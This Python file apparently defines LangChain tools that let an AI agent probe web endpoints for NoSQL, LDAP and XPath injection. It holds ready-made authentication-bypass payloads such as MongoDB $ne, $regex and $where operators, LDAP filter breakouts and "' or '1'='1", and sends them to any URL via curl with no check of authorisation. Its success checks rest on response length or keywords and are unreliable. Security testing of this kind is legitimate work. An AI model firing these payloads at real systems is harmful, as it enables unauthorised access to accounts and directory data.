"""
NoSQL & LDAP Injection Tester
Tests for NoSQL (MongoDB) and LDAP injection vulnerabilities
"""

from langchain.tools import tool
import subprocess
import json
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse


NOSQL_PAYLOADS = {
    "mongo_or": {
        "json": {"username": {"$or": [{"": ""}]}, "password": {"$ne": ""}},
        "url": 'username[$or][0][]=&password[$ne]='
    },
    "mongo_regex": {
        "json": {"username": {"$regex": ".*"}, "password": {"$ne": ""}},
        "url": 'username[$regex]=.*&password[$ne]='
    },
    "mongo_where": {
        "json": {"$where": "1=1"},
        "url": "$where=1=1"
    },
    "mongo_ne": {
        "json": {"username": {"$ne": None}},
        "url": "username[$ne]="
    },
    "mongo_exists": {
        "json": {"admin": {"$exists": True}},
        "url": "admin[$exists]=true"
    },
}

LDAP_PAYLOADS = {
    "ldap_or": "*",
    "ldap_wildcard": "*)(|(uid=*",
    "ldap_comment": "*%23",
    "ldap_injection": "admin*",
}


@tool
def test_nosql_injection(url: str, param_name: str = None) -> dict:
    """
    Test for NoSQL injection vulnerabilities
    
    Args:
        url: Target URL with parameter(s)
        param_name: Specific parameter to test
    
    Returns:
        Dictionary with NoSQL injection findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    
    if not params:
        findings["error"] = "No URL parameters found"
        return findings
    
    test_params = [param_name] if param_name else list(params.keys())[:1]
    
    for param in test_params:
        if param not in params:
            continue
        
        for payload_name, payload_info in NOSQL_PAYLOADS.items():
            payload_url = payload_info["url"]
            
            # Construct test URL
            test_url = f"{url.split('?')[0]}?{payload_url}"
            
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "5", test_url],
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                
                response = result.stdout
                status_code = result.returncode
                
                # Check for successful injection
                # Look for 200 OK with different content than original
                if status_code == 0 and len(response) > 100:
                    findings["vulnerable"] = True
                    findings["findings"].append(f"NoSQL injection: {payload_name}")
                    findings["evidence"].append({
                        "payload": payload_name,
                        "response_length": len(response)
                    })
            
            except Exception:
                pass
    
    return findings


@tool
def test_nosql_json_injection(url: str) -> dict:
    """
    Test for NoSQL injection in JSON POST bodies
    
    Args:
        url: Target endpoint accepting JSON
    
    Returns:
        Dictionary with findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    for payload_name, payload_info in NOSQL_PAYLOADS.items():
        payload = payload_info["json"]
        
        try:
            payload_json = json.dumps(payload)
            
            result = subprocess.run(
                ["curl", "-s", "-m", "5", "-H", "Content-Type: application/json",
                 "-d", payload_json, url],
                capture_output=True,
                timeout=10,
                text=True
            )
            
            response = result.stdout.lower()
            
            # Check for successful injection indicators
            if any(word in response for word in ["success", "true", "authenticated", "logged", "welcome"]):
                findings["vulnerable"] = True
                findings["findings"].append(f"NoSQL injection in JSON: {payload_name}")
                findings["evidence"].append({
                    "payload": payload_name,
                    "response": response[:200]
                })
        
        except Exception:
            pass
    
    return findings


@tool
def test_ldap_injection(url: str, param_name: str = None) -> dict:
    """
    Test for LDAP injection vulnerabilities
    
    Args:
        url: Target URL with search parameter
        param_name: Parameter name (usually 'username' or 'search')
    
    Returns:
        Dictionary with LDAP injection findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    
    if not params:
        findings["error"] = "No URL parameters found"
        return findings
    
    test_params = [param_name] if param_name else list(params.keys())[:1]
    
    for param in test_params:
        if param not in params:
            continue
        
        for payload_name, payload in LDAP_PAYLOADS.items():
            test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params_dict[param] = payload
            
            test_query = urlencode(test_params_dict)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "5", test_url],
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                
                response = result.stdout
                
                # Check for LDAP error messages
                ldap_errors = ["ldap", "invalid search", "syntax error", "no such object"]
                
                if any(error in response.lower() for error in ldap_errors):
                    findings["vulnerable"] = True
                    findings["findings"].append(f"LDAP injection: {payload_name}")
                    findings["evidence"].append({
                        "payload": payload,
                        "error": True
                    })
                
                # Check for successful filter bypass
                if len(response) > 100 and "admin" in response.lower():
                    findings["vulnerable"] = True
                    findings["findings"].append(f"LDAP filter bypass: {payload_name}")
            
            except Exception:
                pass
    
    return findings


@tool
def test_xpath_injection(url: str, param_name: str = None) -> dict:
    """
    Test for XPath injection vulnerabilities
    
    Args:
        url: Target URL with parameter
        param_name: Parameter to test
    
    Returns:
        Dictionary with XPath findings
    """
    findings = {
        "vulnerable": False,
        "findings": [],
        "evidence": []
    }
    
    xpath_payloads = {
        "or_true": "' or '1'='1",
        "comment": "' or 1=1 or '",
        "wildcard": "*",
        "function": "' and substring(name(),1,1)='a",
    }
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query) if parsed.query else {}
    
    for param in list(params.keys())[:1]:
        for payload_name, payload in xpath_payloads.items():
            test_params_dict = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
            test_params_dict[param] = payload
            
            test_query = urlencode(test_params_dict)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment))
            
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "5", test_url],
                    capture_output=True,
                    timeout=10,
                    text=True
                )
                
                response = result.stdout.lower()
                
                # Check for XPath errors
                if any(error in response for error in ["xpath", "xml", "parsing", "syntax"]):
                    findings["vulnerable"] = True
                    findings["findings"].append(f"XPath injection: {payload_name}")
            
            except Exception:
                pass
    
    return findings
